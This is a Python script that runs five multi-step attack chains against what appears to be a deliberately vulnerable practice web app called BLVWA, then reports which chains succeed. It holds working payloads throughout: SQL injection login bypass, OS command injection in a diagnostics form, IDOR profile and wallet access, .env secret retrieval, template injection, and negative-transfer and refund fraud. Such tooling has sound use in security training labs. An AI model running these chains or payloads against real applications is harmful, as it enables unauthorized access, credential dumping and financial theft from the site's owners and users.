#!/usr/bin/env python3
"""
BLVWA Attack Chain Validator — Tests multi-stage exploit chains.
"""

import asyncio
import time
from datetime import datetime

import httpx
from rich.console import Console
from rich.table import Table

from config import TARGET_URL, REQUEST_TIMEOUT

console = Console()


ATTACK_CHAINS = [
    {
        "id": "CHAIN-001",
        "name": "SQLi → Admin Dashboard Access",
        "severity": "Critical",
        "steps": [
            {
                "description": "SQL Injection auth bypass",
                "method": "POST",
                "url": "/login",
                "data": {"username": "admin' OR '1'='1", "password": "x"},
                "expect": {"type": "redirect", "value": "/"},
            },
            {
                "description": "Access admin portal",
                "method": "GET",
                "url": "/admin_p0rtal_secret_path",
                "data": None,
                "expect": {"type": "body_contains", "value": "Secret Research Portal"},
            },
            {
                "description": "Dump all users",
                "method": "GET",
                "url": "/admin/users",
                "data": None,
                "expect": {"type": "body_contains", "value": "password_hash"},
            },
        ],
    },
    {
        "id": "CHAIN-002",
        "name": "Forced Browsing → RCE via Command Injection",
        "severity": "Critical",
        "steps": [
            {
                "description": "Discover admin path via robots.txt",
                "method": "GET",
                "url": "/robots.txt",
                "data": None,
                "expect": {"type": "body_contains", "value": "admin_p0rtal_secret_path"},
            },
            {
                "description": "Access diagnostics",
                "method": "GET",
                "url": "/admin/diagnostics",
                "data": None,
                "expect": {"type": "body_contains", "value": "Network Diagnostics"},
            },
            {
                "description": "Execute OS command",
                "method": "POST",
                "url": "/admin/diagnostics",
                "data": {"host": "127.0.0.1; echo CHAIN002_RCE"},
                "expect": {"type": "body_contains", "value": "CHAIN002_RCE"},
            },
        ],
    },
    {
        "id": "CHAIN-003",
        "name": "IDOR → Profile Data → Wallet Theft",
        "severity": "High",
        "steps": [
            {
                "description": "View admin profile via IDOR",
                "method": "GET",
                "url": "/profile?id=1",
                "data": None,
                "expect": {"type": "body_contains", "value": "admin"},
            },
            {
                "description": "Check admin wallet balance via API",
                "method": "GET",
                "url": "/api/v1/wallet/balance?uid=1",
                "data": None,
                "expect": {"type": "body_contains", "value": "balance"},
            },
            {
                "description": "Steal funds via negative transfer",
                "method": "POST",
                "url": "/wallet/transfer",
                "data": {"to_user_id": "1", "amount": "-500"},
                "expect": {"type": "body_contains", "value": "Transfer Complete"},
            },
        ],
    },
    {
        "id": "CHAIN-004",
        "name": "Info Disclosure → Secret Discovery → Admin Takeover",
        "severity": "Critical",
        "steps": [
            {
                "description": "Retrieve .env file",
                "method": "GET",
                "url": "/.env",
                "data": None,
                "expect": {"type": "body_contains", "value": "ADMIN_SECRET_PATH"},
            },
            {
                "description": "Access secret admin portal",
                "method": "GET",
                "url": "/admin_p0rtal_secret_path",
                "data": None,
                "expect": {"type": "body_contains", "value": "Secret Research Portal"},
            },
            {
                "description": "Exploit SSTI for code execution",
                "method": "GET",
                "url": "/admin/analytics?report={{7*7}}",
                "data": None,
                "expect": {"type": "body_contains", "value": "49"},
            },
        ],
    },
    {
        "id": "CHAIN-005",
        "name": "Coupon Brute Force → Free Order → Refund Abuse",
        "severity": "High",
        "steps": [
            {
                "description": "Brute force hidden coupon",
                "method": "POST",
                "url": "/coupons/validate",
                "data": {"code": "BURGER100"},
                "expect": {"type": "redirect_contains", "value": "success=BURGER100"},
            },
            {
                "description": "Access staff panel without role check",
                "method": "GET",
                "url": "/staff/dashboard",
                "data": None,
                "expect": {"type": "body_contains", "value": "Staff Dashboard"},
            },
            {
                "description": "Process duplicate refund",
                "method": "POST",
                "url": "/staff/refunds/process",
                "data": {"order_id": "BL-1001", "amount": "999"},
                "expect": {"type": "body_contains", "value": "success"},
            },
        ],
    },
]


async def run_chain(client: httpx.AsyncClient, chain: dict, cookies: dict) -> dict:
    """Execute an attack chain step-by-step."""
    result = {
        "id": chain["id"],
        "name": chain["name"],
        "severity": chain["severity"],
        "steps": [],
        "overall": "PASS",
        "timestamp": datetime.now().isoformat(),
    }

    for i, step in enumerate(chain["steps"]):
        step_result = {"step": i + 1, "description": step["description"], "status": "FAIL", "detail": ""}
        try:
            url = f"{TARGET_URL}{step['url']}"
            if step["method"] == "GET":
                resp = await client.get(url, cookies=cookies, follow_redirects=False, timeout=REQUEST_TIMEOUT)
            else:
                resp = await client.post(url, data=step.get("data", {}), cookies=cookies, follow_redirects=False, timeout=REQUEST_TIMEOUT)

            expect = step["expect"]
            if expect["type"] == "body_contains":
                if expect["value"] in resp.text:
                    step_result["status"] = "PASS"
            elif expect["type"] == "redirect":
                if resp.status_code in (301, 302):
                    step_result["status"] = "PASS"
            elif expect["type"] == "redirect_contains":
                loc = resp.headers.get("location", "")
                if expect["value"] in loc:
                    step_result["status"] = "PASS"

            step_result["detail"] = f"HTTP {resp.status_code}"
            cookies.update(dict(resp.cookies))

        except Exception as e:
            step_result["detail"] = str(e)[:100]

        result["steps"].append(step_result)
        if step_result["status"] == "FAIL":
            result["overall"] = "FAIL"
            break  # Chain broken

    if all(s["status"] == "PASS" for s in result["steps"]):
        result["overall"] = "PASS"

    return result


async def run_all_chains():
    """Run all attack chains."""
    console.rule("[bold red]BLVWA Attack Chain Validator[/bold red]")
    console.print(f"[cyan]Chains: {len(ATTACK_CHAINS)}[/cyan]\n")

    results = []
    async with httpx.AsyncClient(verify=False) as client:
        # Auth
        resp = await client.post(
            f"{TARGET_URL}/login",
            data={"username": "guest", "password": "guest"},
            follow_redirects=True,
            timeout=REQUEST_TIMEOUT,
        )
        cookies = dict(resp.cookies)

        for chain in ATTACK_CHAINS:
            result = await run_chain(client, chain, dict(cookies))
            results.append(result)

            icon = "🟢" if result["overall"] == "PASS" else "🔴"
            console.print(f"{icon} {result['id']} — {result['name']}")
            for s in result["steps"]:
                step_icon = "  ✅" if s["status"] == "PASS" else "  ❌"
                console.print(f"   {step_icon} Step {s['step']}: {s['description']} [{s['detail']}]")
            console.print()

    # Summary
    table = Table(title="Attack Chain Results")
    table.add_column("Chain")
    table.add_column("Name")
    table.add_column("Status")
    for r in results:
        status = "[green]PASS[/green]" if r["overall"] == "PASS" else "[red]FAIL[/red]"
        table.add_row(r["id"], r["name"], status)
    console.print(table)

    passed = sum(1 for r in results if r["overall"] == "PASS")
    console.print(f"\n[bold]{passed}/{len(results)} chains exploitable[/bold]")

    return results


if __name__ == "__main__":
    asyncio.run(run_all_chains())
